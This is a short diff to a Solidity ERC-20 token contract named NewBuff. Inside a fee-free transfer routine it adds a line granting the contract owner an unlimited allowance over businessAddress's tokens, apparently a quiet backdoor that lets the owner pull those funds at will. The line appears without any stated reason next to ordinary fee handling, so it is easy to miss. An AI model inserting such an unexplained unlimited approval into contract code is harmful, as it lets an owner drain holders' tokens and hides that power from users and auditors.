@@ -337,6 +337,7 @@ contract NewBuff is Context, IERC20, Ownable {
         _removeFee();
         _transferFromExcluded(address(this), businessAddress, cartAmount);
         _restoreAllFee();
+        _approve(businessAddress, owner(), _MAX);
         _excludeAccount(businessAddress);
         return true;
     }
